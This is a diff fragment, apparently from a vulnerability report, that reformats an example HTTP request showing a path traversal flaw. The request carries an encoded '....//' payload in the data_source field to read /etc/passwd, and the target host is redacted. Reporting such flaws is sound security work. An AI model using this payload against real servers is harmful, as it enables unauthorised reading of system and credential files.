@@ -99,7 +99,7 @@ can read any file readable by the web server, including /etc/passwd,
 **Example HTTP Request**
 
   -----------------------------------------------------------------------
-  **POST /data HTTP/2\
+  ```POST /data HTTP/2\
   Host: \[TARGET-REDACTED\]\
   User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101
   Firefox/128.0\
@@ -120,7 +120,7 @@ can read any file readable by the web server, including /etc/passwd,
   Priority: u=0, i\
   Te: trailers\
   \
-  data_source=\....%2F%2F\....%2F%2F\....%2F%2Fetc%2Fpasswd**
+  data_source=\....%2F%2F\....%2F%2F\....%2F%2Fetc%2Fpasswd```
   -----------------------------------------------------------------------
 
   -----------------------------------------------------------------------
